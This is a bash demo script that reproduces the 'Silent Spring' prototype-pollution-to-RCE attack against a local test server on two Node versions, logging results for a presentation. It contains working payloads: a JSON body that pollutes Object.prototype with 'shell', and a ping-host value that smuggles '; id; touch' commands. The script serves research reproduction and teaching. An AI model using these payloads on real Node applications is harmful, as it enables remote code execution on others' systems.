#!/usr/bin/env bash
#
# run-demo.sh — one-command, Docker-free reproduction of the Silent Spring
# prototype-pollution -> RCE attack. Everything is logged to results/ for the
# presentation.
#
# It runs the identical HTTP exploit against the SAME app on two runtimes:
#   * Node 16.13.1  (the paper's version)  -> expected: RCE works
#   * System Node   (whatever you have)     -> expected: mitigated
#
set -u
cd "$(dirname "$0")/.."
ROOT="$(pwd)"
RESULTS="$ROOT/results"
# Locate the local Node 16 (paper's runtime). Glob for whatever platform build
# scripts/setup.sh downloaded (linux-x64, darwin-arm64, ...), so this can never
# fall out of sync with setup.sh regardless of OS/arch.
N16="$(ls "$ROOT"/vendor/node-v16.13.1-$(uname -s | tr A-Z a-z)-*/bin/node 2>/dev/null | head -1)"
SYS_NODE="$(command -v node)"
PORT16=3116
PORTSYS=3124
STAMP="$(date '+%Y-%m-%d %H:%M:%S')"

mkdir -p "$RESULTS"
# Marker file used as unambiguous proof of arbitrary command execution.
RCE_MARKER="$RESULTS/RCE_PROOF.txt"
rm -f "$RCE_MARKER"

hr() { printf '%s\n' "------------------------------------------------------------"; }
say() { printf '\n\033[1m%s\033[0m\n' "$*"; }

# jget FIELD  -- extract a top-level field from JSON on stdin (no jq needed)
jget() { "$SYS_NODE" -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>{try{console.log(JSON.parse(d)[process.argv[1]])}catch(e){console.log("")}})' "$1"; }

# ---------------------------------------------------------------------------
# run_exploit <node-binary> <port> <label> <logfile> <exploitfile>
# Starts the server, runs the 4-step attack, captures evidence. Echoes the
# final verdict token VULNERABLE|MITIGATED as the last stdout line.
# ---------------------------------------------------------------------------
run_exploit() {
  local NODEBIN="$1" PORT="$2" LABEL="$3" SRVLOG="$4" OUT="$5"
  local BASE="http://127.0.0.1:$PORT"
  local NODEVER; NODEVER="$("$NODEBIN" --version)"

  PORT="$PORT" "$NODEBIN" src/server.js >"$SRVLOG" 2>&1 &
  local SRV=$!
  # wait for server
  for _ in $(seq 1 30); do curl -s "$BASE/api/status" >/dev/null 2>&1 && break; sleep 0.2; done

  {
    echo "# Exploit transcript — $LABEL ($NODEVER)"
    echo "# generated: $STAMP"
    echo

    echo "## Step 1 — baseline state"
    curl -s "$BASE/api/status"; echo

    echo
    echo "## Step 2 — command injection attempt WITHOUT pollution (expected: SAFE)"
    echo "GET /api/ping?host=127.0.0.1; id"
    local r2; r2="$(curl -s "$BASE/api/ping?host=127.0.0.1;%20id")"
    echo "$r2"

    echo
    echo "## Step 3 — Stage 1: pollute Object.prototype via /api/settings (lodash defaultsDeep)"
    echo 'POST /api/settings  {"constructor":{"prototype":{"shell":true}}}'
    curl -s -X POST -H 'Content-Type: application/json' \
      -d '{"constructor":{"prototype":{"shell":true}}}' "$BASE/api/settings"; echo
    echo "-- status after pollution --"
    curl -s "$BASE/api/status"; echo

    echo
    echo "## Step 4 — Stage 2: trigger gadget. Same endpoint, inject '; id' and a proof-of-RCE marker"
    local INJ="127.0.0.1; id; touch '$RCE_MARKER'"
    local ENC; ENC="$("$SYS_NODE" -e 'console.log(encodeURIComponent(process.argv[1]))' "$INJ")"
    echo "GET /api/ping?host=$INJ"
    local r4; r4="$(curl -s "$BASE/api/ping?host=$ENC")"
    echo "$r4"
  } | tee "$OUT"

  kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null

  if grep -q "uid=" "$OUT"; then echo "VULNERABLE"; else echo "MITIGATED"; fi
}

say "Silent Spring — Prototype Pollution -> RCE  |  automated demo  |  $STAMP"
hr
echo "System Node : $("$SYS_NODE" --version)  ($SYS_NODE)"
if [ -x "$N16" ]; then echo "Paper  Node : $("$N16" --version)  (local vendor copy)"; else
  echo "Paper  Node : NOT FOUND (run scripts/setup.sh) — will demo system Node only"; fi
hr

say "[A] Universal gadget probe (standalone, no HTTP)"
if [ -x "$N16" ]; then
  "$N16" scripts/probe-gadget.js | tee "$RESULTS/probe-node16.txt" | tail -6
fi
say "    --- system node ---"
"$SYS_NODE" scripts/probe-gadget.js | tee "$RESULTS/probe-system.txt" | tail -6

V16="n/a"
if [ -x "$N16" ]; then
  say "[B] Full HTTP exploit against live server — Node 16.13.1 (paper's version)"
  hr
  V16="$(run_exploit "$N16" "$PORT16" "Node 16.13.1" "$RESULTS/server-node16.log" "$RESULTS/exploit-node16.txt" | tail -1)"
fi

say "[C] Same HTTP exploit against live server — system Node ($("$SYS_NODE" --version))"
hr
VSYS="$(run_exploit "$SYS_NODE" "$PORTSYS" "system Node" "$RESULTS/server-system.log" "$RESULTS/exploit-system.txt" | tail -1)"

# ---- Summary --------------------------------------------------------------
RCE_PROOF="absent"; [ -f "$RCE_MARKER" ] && RCE_PROOF="present ($RCE_MARKER)"

cat > "$RESULTS/SUMMARY.md" <<EOF
# Silent Spring demo — run summary

- Generated: $STAMP
- Paper: *Silent Spring: Prototype Pollution Leads to RCE in Node.js*, USENIX Security 2023
- Attack: Stage 1 prototype pollution (lodash \`defaultsDeep\`, v4.17.11) → Stage 2 universal gadget (\`child_process.spawn\` reading inherited \`shell\`)

## Result matrix

| Runtime | Universal gadget (probe) | End-to-end HTTP RCE |
|---|---|---|
| Node 16.13.1 (paper) | $( [ -x "$N16" ] && echo VULNERABLE || echo "n/a" ) | **$V16** |
| System Node $("$SYS_NODE" --version) | $(grep -q '"verdict":"VULNERABLE"' "$RESULTS/probe-system.txt" && echo VULNERABLE || echo MITIGATED) | **$VSYS** |

Proof-of-RCE marker file: **$RCE_PROOF**

## What each file contains
- \`probe-node16.txt\` / \`probe-system.txt\` — standalone gadget probe output
- \`exploit-node16.txt\` / \`exploit-system.txt\` — full 4-step HTTP attack transcript
- \`server-node16.log\` / \`server-system.log\` — server-side console (shows pollution firing)
- \`RCE_PROOF.txt\` — file created by the injected command; existence proves arbitrary code execution

## Takeaways for the presentation
1. Passing user data to \`spawn\` as an **argv array is normally safe** — no shell, no injection.
2. A single prototype-pollution write (\`Object.prototype.shell = true\`) **silently re-enables** shell
   interpretation inside Node's own \`child_process\` internals → command injection ("universal gadget").
3. The **injection sink and the gadget live in different, individually-reasonable code** — this is why
   the bug is hard to spot and why the paper needed taint analysis to connect them.
4. Newer Node runtimes hardened the internal gadget (null-prototype default options), so the *same*
   exploit is **mitigated** on modern Node — a concrete argument for keeping runtimes patched.
EOF

say "DONE."
hr
echo "Node 16 end-to-end RCE : $V16"
echo "System Node end-to-end : $VSYS"
echo "RCE proof marker       : $RCE_PROOF"
echo "All artifacts saved to : $RESULTS/"
echo "Summary                : $RESULTS/SUMMARY.md"
hr
